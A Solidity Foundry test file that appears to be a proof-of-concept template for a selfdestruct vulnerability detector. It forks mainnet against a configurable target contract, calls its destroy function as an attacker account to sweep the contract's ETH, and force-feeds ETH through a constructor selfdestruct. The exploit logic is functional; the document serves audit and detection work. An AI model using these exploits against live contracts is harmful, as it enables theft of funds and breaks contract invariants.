// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Selfdestruct: destroy + forced ETH
/// @notice Detector: selfdestruct / bytecode-selfdestruct.
///         (a) destroy(): anyone (or a single key) can selfdestruct the
///             target and sweep its balance to a chosen recipient.
///         (b) forced ETH: selfdestruct ALWAYS force-sends ETH, even to
///             contracts that reject plain transfers -- breaking exact-
///             balance checks and force-funding targets.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. NOTE (Cancun / EIP-6780): selfdestruct in
///      a LATER transaction only moves the balance -- it no longer deletes
///      code. So this PoC asserts the BALANCE moved, not code deletion.
///      The constructor selfdestruct in Forcer still works (same tx as
///      creation).

contract Forcer {
    // Selfdestruct in the constructor: same tx as creation, so the
    // balance transfer still executes post-Cancun.
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_destroySweepsBalance() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        uint256 targetBefore = target.balance;
        require(targetBefore > 0, "target holds no ETH to sweep");

        // TODO: adapt to the target's real destroy function.
        vm.prank(attackerEOA);
        (bool ok,) = target.call(
            abi.encodeWithSignature("destroy(address)", attackerEOA)
        );
        if (!ok) {
            vm.prank(attackerEOA);
            (ok,) = target.call(abi.encodeWithSignature("destroy()"));
        }
        require(ok, "destroy call failed -- adapt to the target's destroy function");
        console.log("target balance before:", targetBefore);
        console.log("target balance after:", target.balance);
        assertEq(target.balance, 0, "exploit did not reproduce: target balance not swept");
    }

    function test_forcedEth() public {
        uint256 targetBefore = target.balance;
        // Force-feed 1 ETH via constructor selfdestruct. Works even if
        // the target has no payable fallback and rejects transfers.
        // NOTE: assert >=, not ==. On a fork, the Forcer's deterministic
        // CREATE address may already hold mainnet dust, which the
        // constructor selfdestruct forwards along with the 1 ETH.
        // (Observed: a CREATE address holding 577021548053172 wei.)
        new Forcer{value: 1 ether}(payable(target));
        console.log("target balance before force-feed:", targetBefore);
        console.log("target balance after force-feed:", target.balance);
        assertGe(target.balance, targetBefore + 1 ether, "forced ETH did not land");
    }
}
